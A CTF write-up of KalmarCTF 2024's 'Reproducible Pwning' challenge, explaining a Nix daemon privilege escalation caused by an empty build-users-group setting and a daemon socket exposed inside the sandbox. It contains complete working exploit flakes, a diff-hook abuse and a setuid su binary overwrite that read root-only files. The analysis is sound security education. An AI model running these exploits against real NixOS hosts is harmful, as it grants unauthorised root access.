+++
title = "KalmarCTF 2024 Write-up: Reproducible Pwning"

[taxonomies]
tags = ["ctf", "ctf-writeup", "nix", "nixos"]
+++

This is a write-up of the "Reproducible Pwning" challenge from KalmarCTF 2024.
This challenge takes us through the inner workings of Nix and a very interesting
privilege escalation that has made me change my own NixOS configuration.
<!-- more -->

While I was already playing KalmarCTF, it was only after a [Mastodon post] that
I noticed this Nix(OS)-related challenge, so thanks to [jade][@leftpaddotpy] for posting this!

## The Challenge

Let's start by taking a look at the challenge.
We were provided with 4 files, a netcat command to spawn a new NixOS VM, and the
following description.

> I got access to this NixOS machine, but only as an unprivileged user.
> Can you see if you can find anything interesting?
>
> The ISO provided runs the same config as the remote except for network
> configuration and how /data is mounted. The flag is at /data/flag.

The given files were a `flake.nix`, a `flake.lock`, a `nix.patch` and
a `nixos.iso` (which was not actually a disk image; more on that later).

We can start by taking a look at the `flake.nix` file, which has some interesting
sections:

```nix, hl_lines=7 15 18
# ...
{
  # ...
  nixpkgs.overlays = [
    (final: prev: {
      nix = final.nixVersions.nix_2_13.overrideAttrs {
        patches = [./nix.patch];
        doInstallCheck = false;
      };
    })
  ];
  # ...
  systemd.services.nix-daemon.serviceConfig.EnvironmentFile = let
    sandbox = pkgs.writeText "nix-daemon-config" ''
      extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
    '';
    buildug = pkgs.writeText "nix-daemon-config" ''
      build-users-group =
    '';
  in
    pkgs.writeText "env" ''
      NIX_USER_CONF_FILES=${sandbox}:${buildug}
    '';
  # ...
}
# ...
```

As we can see, there are two important things happening in this NixOS configuration:
- The Nix version is being overridden (through an overlay) to Nix 2.13(.6);
- Two extra options, `extra-sandbox-paths` and `build-users-group` are being passed
  to the `nix-daemon`. We will delve into the implications of these options later.

To get the whole picture, let's now take a look at the patch that is being applied
to Nix:

```patch
diff --git a/src/libutil/config.cc b/src/libutil/config.cc
index 37f5b50c7..fd824ee03 100644
--- a/src/libutil/config.cc
+++ b/src/libutil/config.cc
@@ -1,3 +1,4 @@
+#include "logging.hh"
 #include "config.hh"
 #include "args.hh"
 #include "abstract-setting-to-json.hh"
@@ -17,6 +18,16 @@ Config::Config(StringMap initials)
 
 bool Config::set(const std::string & name, const std::string & value)
 {
+    if (name.find("build-hook") != std::string::npos
+        || name == "accept-flake-config"
+        || name == "allow-new-privileges"
+        || name == "impure-env") {
+        logWarning({
+            .msg = hintfmt("Option '%1%' is too dangerous, skipping.", name)
+        });
+        return true;
+    }
+
     bool append = false;
     auto i = _settings.find(name);
     if (i == _settings.end()) {
```

It seems like it is blocking a few options from being set, namely `build-hook`,
`post-build-hook`, `pre-build-hook`, `accept-flake-config`, `allow-new-privileges`
and `impure-env`, which gives us a hint that we might want to play around
with options in this challenge.

Finally, we take a look at the `nixos.iso` file.
Surprisingly, the file was quite small, so it certainly couldn't be a disk image.
Instead, it was a Git LFS file:

```
version https://git-lfs.github.com/spec/v1
oid sha256:766941d2f79399f3a4b7c2dcc43be98fe80f5f17fcab34c5d021f5b4f500135d
size 339738624
```

I spent way too long figuring out what to do with this and how to use it to download
the ISO, only to realise I didn't have enough information to download a file from Git LFS,
since I was missing the repository name.
Upon further inspection of the flake we were given, I noticed it outputs an `iso`
package that we can build (duh).
By running `nix build .#iso` and waiting a few minutes for Nix to compile, I got
the ISO and unsurprisingly the hash matched what was in the Git LFS file (hurray
for reproducibility!). Nice.

```
❯ sha256sum result/iso/nixos.iso
766941d2f79399f3a4b7c2dcc43be98fe80f5f17fcab34c5d021f5b4f500135d  result/iso/nixos.iso
```

## Investigating Attack Vectors

With all the files inspected and (moderately) understood, it was time to figure out
what to do with all the information I had.
As a sanity check, the first thing I did was checking if the flag was somehow stored
in the Nix store, but it was not.

I then decided to take a look at the Nix 2.13.6 code, more specifically into the
`nix-daemon` code.
A quick clone of the repository and grepping for `nix-daemon` directed me to the
`src/nix/daemon.cc` file, which seems to contain the logic for starting the daemon
and listening for incoming connections on its Unix socket.
I am not very proficient with C++, so it took me a while to figure out everything
that was going on, but I eventually found the `daemonLoop` function that
is responsible for accepting new connections and determining if they come from a
trusted user or not.

One part of that function that immediately stood out was this [block of (disabled) code][daemon-snippet]:

```cpp
static void daemonLoop()
{
  // ...
  processConnection(openUncachedStore(), from, to, trusted, NotRecursive, [&](Store & store) {
#if 0
      /* Prevent users from doing something very dangerous. */
      if (geteuid() == 0 &&
          querySetting("build-users-group", "") == "")
          throw Error("if you run 'nix-daemon' as root, then you MUST set 'build-users-group'!");
#endif
      store.createUser(user, peer.uid);
  });
  // ...
}
```

It does seem like at some point this code was introduced to prevent running `nix-daemon` as root
if `build-users-group` is empty, but it was disabled _16 years ago_ because apparently it
[breaks RPM builds]. :upside_down_face:
The comment in the code clearly states this is _very dangerous_ :ghost:, so this was definitely
the right track.

Upon opening the `nix.conf(5)` man page, we can read the description of the `build-users-group`
option (emphasis mine):

> This options specifies the Unix group containing the Nix build user accounts. In multi-user
> Nix installations, builds should not be performed by the Nix account since that would allow users
> to arbitrarily modify the Nix store and database by supplying specially crafted builders; and
> they cannot be performed by the calling user since that would allow him/her to influence the build result.
>
> Therefore, if this option is non-empty and specifies a valid group, builds will be performed under
> the user accounts that are a member of the group specified here (as listed in /etc/group).
> Those user accounts should not be used for any other purpose!
>
> [...]
>
> If the build users group is empty, **builds will be performed under the uid of the Nix process**
> (that is, the uid of the caller if NIX_REMOTE is empty, the uid under which the Nix daemon runs
> if NIX_REMOTE is daemon).
> **Obviously, this should not be used with a nix daemon accessible to untrusted clients.**
>
> Defaults to nixbld when running as root, empty otherwise.

So it seems that since `build-users-group` is empty, builds will be performed by the root user,
which, by default, is a trusted user in the eyes of the `nix-daemon`.

Putting together all the puzzle pieces, I realise that the `nix-daemon` is exposed inside
the build sandbox at `/tmp/daemon` because of the aforementioned `extra-sandbox-paths` option,
which means we can get trusted access to the `nix-daemon`!

## Turning on the VM

To test this theory, I tweak the `flake.nix` a bit to set a password for both the `root` and `user`
users and enable SSH access for `root`.
This allows me to access logs from the `nix-daemon`, which [prints a message][daemon-log-message]
every time a connection is initiated, indicating whether the user is trusted or not.

Turning on the VM with QEMU and SSH'ing into both users, I upload a simple flake that contains
a derivation that opens a connection to the `nix-daemon` socket during build.

```nix, hl_lines=32
{
  description = "Exploit for Reproducible Pwn - KalmarCTF 2024";

  inputs = {
    nixpkgs.url = "github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a"; # nixos-unstable
  };

  outputs = {
    self,
    nixpkgs,
  }: let
    system = "x86_64-linux";
    pkgs = import nixpkgs {
      inherit system;
      overlays = [
        (final: prev: {
          nix = final.nixVersions.nix_2_13;
        })
      ];
    };
  in {
    packages.${system}.exploit = pkgs.stdenv.mkDerivation {
      name = "exploit";

      # Just run installPhase and skip everything else
      phases = ["installPhase"];

      buildInputs = [
        pkgs.netcat
      ];

      installPhase = ''
        nc -U /tmp/daemon
      '';
    };
  };
}
```

By building this package using the `user` user, with `nix build .#exploit`,
we can see in the `nix-daemon` logs (`journalctl -xefu nix-daemon` from the `root` user)
that the build is indeed running as the `root` user!

```
nix-daemon[1130]: accepted connection from pid 2925, user user
nix-daemon[1130]: accepted connection from pid 4643, user root (trusted)
```

## Escaping the Sandbox

Now that we have validated that the build indeed runs as root and that we have
trusted access to the `nix-daemon`, we need to find a way to escape the build
sandbox, since the `/data` directory is not exposed inside it.

My first thought was to take a look at the [available operations exposed by the `nix-daemon`][daemon-ops]
and figure out if I could send a specially crafted payload through the socket
that would allow me to get the daemon to copy `/data/flag` into the (world-readable)
Nix store. However, I was deterred by my poor understanding of C++ and by trying
out the experiment locally on my laptop through `nix-store --add`, which promptly ruined
those plans:

```
❯ nix-store --add /data/flag
error (ignored): error: end of string reached
error: opening file '/data/flag': Permission denied
```

I briefly looked at the daemon code to understand if this was being checked on the
`nix-store` command or on the daemon, but from my (limited) understanding of the code,
it seems like the `nix-daemon` only receives the data to be added to the Nix store
and not a file path, which means it is responsibility of whoever is connecting to the
daemon to read the file.
Bummer.

Having hit a dead end, I decided to search for "privilege escalation" in the Nix
repository's issue tracker which yielded
[an interesting comment about running commands as root without password][nix-pe-issue].
If you are not aware, this is the same problem as using Docker while having your user
as a member of the `docker` group: it allows for passwordless privilege escalation
through a daemon running at root.
This is apparently a conscious design decision of both Docker and Nix, and is clearly
pointed out in their respective documentation.
Unfortunately for us, the given example in the issue is using `post-build-hook`,
which is disabled in the challenge due to the patch that has been applied to Nix.

However, the idea remains, and two possible paths forward pop in my head:
- Since it is possible to control the options passed to `nix build`,
  could we take advantage of our trusted user privileges to build a
  new derivation that would escape the sandbox?
  Is it even possible to build a derivation inside another derivation?
- The aforementioned issue also mentions that, once you are a trusted user,
  you are able to "access or replace store path contents that are critical for
  system security", which gave me the idea of trying to change the `nix-daemon`
  configuration to include `/data` in the sandbox.

### Building a Flake Inside a Derivation

With both of these ideas in mind, I started with the first one and built
a small flake:

```nix
{
  inputs = {
    nixpkgs.url = "github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a"; # nixos-unstable
  };

  outputs = {
    self,
    nixpkgs,
  }: let
    system = "x86_64-linux";
    pkgs = import nixpkgs {
      inherit system;
    };
  in {
    packages.${system}.exploit-inner = pkgs.stdenv.mkDerivation {
      name = "exploit-inner";

      # Just run installPhase and skip everything else
      phases = ["installPhase"];

      installPhase = ''
        mkdir $out
        cat /data/flag
        cp /data/flag $out
      '';
    };
  };
}
```

This flake gets the flag from `/data/flag` and places it in the derivation
output. It also prints it to stdout, which should allow us to get the
flag as well if it works.

As we are now a trusted user, we are able to pass certain options to the daemon,
one of which is `sandbox-paths`, which allows us to specify which paths
will be exposed inside a sandbox.
With this in mind, we simply build this inner flake from inside the other one
we already had by changing the `installPhase`:

```nix
{
  # ...
  packages.${system}.exploit = pkgs.stdenv.mkDerivation {
    # ...
    installPhase = ''
      # Use the exposed socket inside the sandbox
      export NIX_REMOTE=unix:///tmp/daemon
      # Build the flake
      nix --extra-experimental-features "nix-command flakes" \
        build \
        $src#exploit-inner \
        --option sandbox-paths /data

      # Copy flag to output
      mkdir $out
      cp result/flag $out
    '';
  };
  # ...
}
```

As a result, we end up with the following file structure:

```
.
├── flake.lock
├── flake.nix
└── src
   ├── flake.lock
   └── flake.nix
```

I had high hopes for this strategy, but upon copying the files to the VM
and building the flake, I got the following error message.

```hl_lines=11
[user@nixos:~]$ nix build .#exploit
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
error: builder for '/nix/store/czdlf1flmdqh2xhj0rl80s62x4dkh65l-exploit.drv' failed with exit code 1;
       last 3 log lines:
       > Running phase: installPhase
       > warning: you don't have Internet access; disabling some network-dependent features
       > error: getting status of '/nix/store/09r5picm4ibj3dbb51jsmfdplf6j9z6y-source': No such file or directory
       For full logs, run 'nix log /nix/store/czdlf1flmdqh2xhj0rl80s62x4dkh65l-exploit.drv'.
```

It appears that the flake is copied to the nix store (the folder does indeed exist
outside the sandbox), but the sandbox does not allow the builder to access it,
so we get this error.

At this point I gave up trying to get the derivation build to work and started looking
into the second attack vector, modifying the Nix store.
Little did I know how close I was...

### Modifying the Nix Store

As mentioned previously, my goal for modifying the Nix store was to change the
configuration of the `nix-daemon`, more specifically the file that contained
the `extra-sandbox-paths` configuration:

```
[root@nixos:~]# cat /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
```

If I could change that file to include the `/data` directory in the sandbox,
I would be able to get the flag from inside the derivation,
and according to the previously mentioned GitHub issue, this is possible.

Unfortunately, after spending way too long trying to figure out a way to
overwrite files in the store, I did not get anywhere, even though there is
likely something that I missed.

As I already had this file in the Nix store of my own laptop from
building the ISO, I tried to somehow tamper with it.
Sadly, my experiments were fairly limited since I am not very knowledgable with
the commands used to interact with the store.
As a result, my plan for tampering this would be to copy the file to
a temporary Nix store, modify it, and copy it back.

To achieve this, I firstly created a new directory `/tmp/store` and
used `nix copy` to populate the store with our target file:

```sh
nix copy --to /tmp/store --no-check-sigs /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
```

This works as intended, which means I went ahead and edited the file, taking
care to add write permissions beforehand and removing them afterwards:

```sh
cd /tmp/store/nix/store
chmod +w y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
echo "extra-sandbox-paths = /data" > y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
chmod -w y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
```

Finally, I (tried to) copy it back to my own store:

```sh
nix copy --from /tmp/store --no-check-sigs /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
```

The command did not output anything, but checking the file in the store reveals
that it has not been changed:

```
❯ cat /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config

extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
```

Running the `nix copy` command with `-vv` reveals that 0 files were copied, presumably
because it already exists in the destination.
I tried a few flags such as `--repair` and `--refresh`, but none of them helped.

After some rubber duck debugging with my teammates, I decided to abandon this
effort and go back to exploring the idea of building a derivation inside a derivation,
but this time without using flakes.

### Building a Package inside a Derivation

This ended up being pretty similar to my previous attempt, since the only
difference is the lack of flakes, which meant I had to go back and
remembered how to *not* use flakes.
After some time searching, I ended up with the following nix file:

```nix
let
  pkgs = import <nixpkgs> {};
in {
  exploit-inner = pkgs.stdenv.mkDerivation {
    name = "exploit-inner";

    phases = ["installPhase"];

    installPhase = ''
      mkdir $out
      cat /data/flag
      cp /data/flag $out
    '';
  };
}
```

It is now possible to build this from the outer flake,
while making sure to pass it the path to `nixpkgs`, which
cannot otherwise be found by `nix-build`:

```nix, hl_lines=9-11
{
  # ...
  packages.${system}.exploit = pkgs.stdenv.mkDerivation {
    # ...
    src = ./inner.nix;
    installPhase = ''
      export NIX_REMOTE=unix:///tmp/daemon
      cp $src default.nix
      nix-build -A exploit-inner \
        -I nixpkgs=${nixpkgs} \
        --option sandbox-paths /data
      mkdir $out
      cp result/flag $out
    '';
  };
}
```

Copying these files to the VM and building the derivation gives
us the flag! :tada:

```hl_lines=16
[user@nixos:~]$ nix build .#exploit
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
error: builder for '/nix/store/sz3117jmlliqvnsd3f7g3vnigfa97x2r-exploit.drv' failed with exit code 1;
       last 10 log lines:
       > warning: Option 'accept-flake-config' is too dangerous, skipping.
       > warning: Option 'allow-new-privileges' is too dangerous, skipping.
       > warning: Option 'build-hook' is too dangerous, skipping.
       > warning: Option 'post-build-hook' is too dangerous, skipping.
       > warning: Option 'pre-build-hook' is too dangerous, skipping.
       > building '/nix/store/rbyna569136fcxdd8g38vmg2dwkjb4a6-exploit-inner.drv'...
       > Running phase: installPhase
       > kalmar{faker_flag}
       > /nix/store/34arwa2ixqh46sc9v3gksgiglxpmzfll-exploit-inner
       > cp: cannot stat 'result/flag': No such file or directory
       For full logs, run 'nix log /nix/store/sz3117jmlliqvnsd3f7g3vnigfa97x2r-exploit.drv'.
```

I was still not happy since I wanted to have the flag be placed in the output
of the derivation, but it appears there's an error related to copying it to the
output folder.
Turns out this is the same problem as I was facing with the flake: the path the
`result` symlink points to (`/nix/store/34arwa2ixqh46sc9v3gksgiglxpmzfll-exploit-inner`)
exists, but it is inaccessible from inside the sandbox.
This can be quickly fixed by copying the symlink itself to the output folder,
taking care to pass the `--no-dereference` to `cp` to preserve the symlink
(i.e., `cp --no-dereference result $out`).

As a result, the exploit can be reduced to simply two files and two commands:

```
.
├── flake.nix
└── inner.nix
```

```
[user@nixos:~]$ nix build .#exploit
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.

[user@nixos:~]$ cat result/result/flag
kalmar{faker_flag}
```

Beautiful.

<details>
<summary>Full exploit files</summary>

```nix
# flake.nix
{
  description = "Exploit for Reproducible Pwn - KalmarCTF 2024";

  inputs = {
    nixpkgs.url = "github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a"; # nixos-unstable
  };

  outputs = {
    self,
    nixpkgs,
  }: let
    system = "x86_64-linux";
    pkgs = import nixpkgs {
      inherit system;
      overlays = [
        (final: prev: {
          nix = final.nixVersions.nix_2_13;
        })
      ];
    };
  in {
    packages.${system}.exploit = pkgs.stdenv.mkDerivation {
      name = "exploit";

      src = ./inner.nix;

      buildInputs = [
        pkgs.nix
      ];

      phases = ["installPhase"];

      installPhase = ''
        export NIX_REMOTE=unix:///tmp/daemon
        cp $src default.nix
        nix-build -A exploit-inner -I nixpkgs=${nixpkgs} --option sandbox-paths /data
        mkdir $out
        cp --no-dereference result $out
      '';
    };
  };
}
```

```nix
# inner.nix
let
  pkgs = import <nixpkgs> {};
in {
  exploit-inner = pkgs.stdenv.mkDerivation {
    name = "exploit-inner";

    phases = ["installPhase"];

    installPhase = ''
      mkdir $out
      cat /data/flag
      cp /data/flag $out
    '';
  };
}
```

</details>

## Intended Solution

After talking with the challenge author, [niko][@nrab@hachyderm.io], I was made aware
that there were two intended solutions, and neither of them included the use
of `sandbox-paths` (or disabling the sandbox completely).
The first one (and easiest) was to instead use `diff-hook` to run code as root
in a similar fashion to the forbidden `post-build-hook`.
The second one was to leverage read-write access to the Nix store as root to edit
some critical files in the system, similarly to what I tried to (unsuccessfully)
achieve.

Let's take a look at both of them and how they could be used.

### Abusing diff-hook

After taking a look at the [manual for `diff-hook`][diff-hook-manual],
it looks like the "diff hook is executed by the same user and group who
ran the build", which in our case means the root user.
Additionally, it appears that this hook is not run inside the sandbox,
which means it has access to the flag.

This `diff-hook` is executed when the output of the same derivation differs
from a previous build, with the goal of calculating the differences
between the two builds (hence the name).
Therefore, to take advantage of `diff-hook`, we need to build an unstable
derivation, that is, a derivation that doesn't always produce the same output.
An easy way to achieve this is to read from `/dev/random` and write it
to the derivation output, as such:

```nix, hl_lines=10
{
  exploit-inner = pkgs.stdenv.mkDerivation {
    name = "exploit-inner";

    phases = ["installPhase"];

    installPhase = ''
      mkdir $out
      # Write 16 random bytes to $out/data
      dd if=/dev/urandom of=$out/data bs=16 count=1
    '';
  };
}
```

With our unstable derivation at hand, we can now build it twice,
making sure to tell Nix to rebuild the derivation a second time
with the `diff-hook` and to check it against the previous build
with the `--check` option, otherwise it would just realise it had
already been built and do nothing.

Our specially crafted `diff-hook` simply copies the flag, which
it has access to, to a different file that is readable by the
non-root user.

```nix, hl_lines=13-15 20
# ...
{
  packages.${system} = rec {
    exploit = pkgs.stdenv.mkDerivation {
      # ...
      installPhase = ''
        export NIX_REMOTE=unix:///tmp/daemon
        cp $src default.nix
        nix-build -A exploit-inner \
          -I nixpkgs=${nixpkgs}
        nix-build -A exploit-inner \
          -I nixpkgs=${nixpkgs} \
          --option diff-hook ${diffHook} \
          --option run-diff-hook true \
          --check
      '';
    };

    diffHook = pkgs.writeScript "diff-hook" ''
      cat /data/flag > /tmp/flag
    '';
  };
}
```

As expected, building the derivation copies the flag to `/tmp/flag`:

```hl_lines=20
[user@nixos:~]$ nix build .#exploit
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
error: builder for '/nix/store/5d6hd01q1pv41r8025b9q8pbhyqj1fvn-exploit.drv' failed with exit code 1;
       last 8 log lines:
       > Running phase: installPhase
       > /nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner
       > checking outputs of '/nix/store/9z1sjss8m2scwws4d7wwwjzis3hgg8xi-exploit-inner.drv'...
       > Running phase: installPhase
       > 1+0 records in
       > 1+0 records out
       > 16 bytes copied, 0.000148997 s, 107 kB/s
       > error: derivation '/nix/store/9z1sjss8m2scwws4d7wwwjzis3hgg8xi-exploit-inner.drv' may not be deterministic: output '/nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner' differs from '/nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner.check'
       For full logs, run 'nix log /nix/store/5d6hd01q1pv41r8025b9q8pbhyqj1fvn-exploit.drv'.

[user@nixos:~]$ cat /tmp/flag
kalmar{faker_flag}
```

### Abusing Read-Write Access to the Nix Store

This second strategy was pretty much what I wanted to do during the CTF,
but didn't manage to.
However, with more time, a fresh mind, and the assurance that it actually
works, I tried to simply write to a file in the Nix store from inside
the derivation and it actually works!
One small caveat is that you must be able to reference the file from
your derivation, so that it is included in the sandbox, but that is no problem
for the various packages in nixpkgs.

My first instinct with this new ability was to override the `nix.conf` configuration
and add `/data` to the sandbox, just like mentioned previously.
However, this does not work since _someone_ would have to restart `nix-daemon`,
and the only user with the permissions to do so would be `root`.

Another prime target for modifications is any kind of setuid binaries, such as
`sudo`.
While `sudo` has been disabled in this system, many other setuid binaries are still
available, as we can see by taking a look at the [`/run/wrappers/bin` directory][setuid-wrappers].

```
[root@nixos:~]# ls -la /run/wrappers/bin/
total 832
drwxr-xr-x 2 root root         300 Mar 18 19:31 .
drwxr-xr-x 3 root root          80 Mar 18 19:31 ..
-r-s--x--x 1 root root       63472 Mar 18 19:31 chsh
-r-sr-x--- 1 root messagebus 63472 Mar 18 19:31 dbus-daemon-launch-helper
-r-s--x--x 1 root root       63472 Mar 18 19:31 fusermount
-r-s--x--x 1 root root       63472 Mar 18 19:31 fusermount3
-r-s--x--x 1 root root       63472 Mar 18 19:31 mount
-r-s--x--x 1 root root       63472 Mar 18 19:31 newgidmap
-r-s--x--x 1 root root       63472 Mar 18 19:31 newgrp
-r-s--x--x 1 root root       63472 Mar 18 19:31 newuidmap
-r-s--x--x 1 root root       63472 Mar 18 19:31 passwd
-r-s--x--x 1 root root       63472 Mar 18 19:31 sg
-r-s--x--x 1 root root       63472 Mar 18 19:31 su
-r-s--x--x 1 root root       63472 Mar 18 19:31 umount
-r-s--x--x 1 root root       63472 Mar 18 19:31 unix_chkpwd
```

Realistically, any of these could be chosen, since they all run as root,
but for the purpose of this example I am going with `su`, which is provided
by the `shadow` package (as shown by a quick `readlink $(whereis su)`).

```
[user@nixos:~]$ readlink $(whereis su)
/nix/store/bys9y4myz2a042l6yscf7gxibi4aw8c7-shadow-4.14.3-su/bin/su
```

With this in mind, we can now change our derivation to override the `su`
binary with a custom binary that just prints the flag.
To achieve this, we can copy our malicious binary over the `su` binary
in `pkgs.shadow.su` ([`su` is the output of the `shadow` package][su-output] that
actually includes the `su` binary).
Initially, I used a simple bash script that would just `cat` the flag, but
[Linux ignores the setuid bit on all interpreted executables][setuid-shell],
which meant the script did not run as root and failed to print it.
For that reason, we can resort to a simple C binary that does the same thing.

```nix, hl_lines=10
# ...
{
  packages.${system} = rec {
    exploit = pkgs.stdenv.mkDerivation {
      # ...
      installPhase = ''
        echo ${pkgs.shadow.su}

        chmod +w ${pkgs.shadow.su}/bin/su
        cp ${get-flag}/bin/get-flag ${pkgs.shadow.su}/bin/su
        chmod -w ${pkgs.shadow.su}/bin/su

        echo success > $out
      '';
    };

    # Prints flag to stdout
    get-flag = pkgs.writeCBin "get-flag" ''
      #include <stdio.h>
      int main() {
        char buffer[1024];
        FILE *f = fopen("/data/flag", "r");
        int n = fread(buffer, 1, 1023, f);
        fwrite(buffer, 1, n, stdout);
        return 0;
      }
    '';
  };
}
```

```hl_lines=11
[user@nixos:~]$ nix build .#exploit --print-build-logs
warning: Option 'accept-flake-config' is too dangerous, skipping.
warning: Option 'allow-new-privileges' is too dangerous, skipping.
warning: Option 'build-hook' is too dangerous, skipping.
warning: Option 'post-build-hook' is too dangerous, skipping.
warning: Option 'pre-build-hook' is too dangerous, skipping.
exploit> Running phase: installPhase
exploit> /nix/store/bys9y4myz2a042l6yscf7gxibi4aw8c7-shadow-4.14.3-su

[user@nixos:~]$ su
kalmar{faker_flag}
```

And we got the flag again! :partying_face:

## Final Remarks

I enjoyed this challenge a lot and I'm looking forward for more Nix-related challenges
in future CTFs.
Diving inside Nix's inner workings has made me grasp a better understanding of how
it all works, and it has even made me [remove myself from the `trusted-users`][remove-trusted-users]
in my own systems.

Furthermore, I was suspicious of the use of such an old version of Nix (2.13), but I replicated
the three exploits in Nix 2.18.1 (the "default" for the pinned commit in the challenge)
and they worked flawlessly.

As final acknowledgements, I have to thank [jade][@leftpaddotpy] for the initial
[Mastodon post], [niko][@nrab@hachyderm.io] for making this awesome challenge,
and my teammates for the rubber duck debugging during the CTF.

[Mastodon post]: https://hachyderm.io/@leftpaddotpy/112103523507978883
[daemon-snippet]: https://github.com/NixOS/nix/blob/2.13.6/src/nix/daemon.cc#L244-L252
[breaks RPM builds]: https://github.com/NixOS/nix/commit/98968fbb63a1a049b2439bfc2a7d53e5b51471e3
[daemon-log-message]: https://github.com/NixOS/nix/blob/2.13.6/src/nix/daemon.cc#L215-L217
[nix-pe-issue]: https://github.com/NixOS/nix/issues/9649#issuecomment-1868001568
[daemon-ops]: https://github.com/NixOS/nix/blob/2.13.6/src/libstore/daemon.cc#L269
[@nrab@hachyderm.io]: https://hachyderm.io/@nrab
[diff-hook-manual]: https://github.com/NixOS/nix/blob/2.13.6/doc/manual/src/advanced-topics/diff-hook.md
[setuid-wrappers]: https://discourse.nixos.org/t/how-to-create-setuid-wrapper-for-installed-program/2590/2
[su-output]: https://github.com/NixOS/nixpkgs/blob/6e2f00c83911461438301db0dba5281197fe4b3a/pkgs/os-specific/linux/shadow/default.nix#L88-L90
[setuid-shell]: https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts
[remove-trusted-users]: https://github.com/diogotcorreia/dotfiles/commit/e8cd4c0676eb8cc6ce7c7e814846831568adb735
[@leftpaddotpy]: https://hachyderm.io/@leftpaddotpy
